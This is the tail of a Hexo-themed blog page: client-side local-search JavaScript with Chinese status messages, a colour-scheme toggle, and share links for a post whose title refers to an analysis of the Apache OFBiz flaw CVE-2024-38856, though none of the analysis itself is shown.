        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CVE-2024-38856%20Apache%20OFBiz18.12.15%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FCVE-2024-38856%2520Apache%2520OFBiz18.12.15%2520%25E4%25BB%25BB%25E6%2584%258F%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E.html + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/CVE-2024-38856%20Apache%20OFBiz18.12.15%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
